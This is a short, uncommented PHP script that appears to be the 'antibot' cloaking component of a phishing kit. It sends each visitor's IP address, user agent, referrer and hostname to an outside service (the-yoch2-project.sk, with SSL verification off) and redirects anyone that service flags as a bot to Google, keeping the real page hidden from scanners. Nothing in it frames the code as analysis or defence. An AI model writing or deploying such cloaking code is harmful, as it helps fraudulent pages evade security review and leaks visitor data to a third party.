<?php


$ip = getenv('REMOTE_ADDR');
$ua = $_SERVER['HTTP_USER_AGENT'];
$hn = gethostbyaddr($_SERVER['REMOTE_ADDR']);
if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NONE';};
$data = ['ip' => $ip ,'useragent' => $ua ,'referrer' => $rf ,'hostname' => $hn];
$antibotsite='http://the-yoch2-project.sk/botkilla?v=2&key=Wm1NM1lqQmpZV1kgWW9DaGk=';
$ch = curl_init($antibotsite);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
if($result=="1"){
    die(header("location: https://href.li/?https://google.com"));
}



?>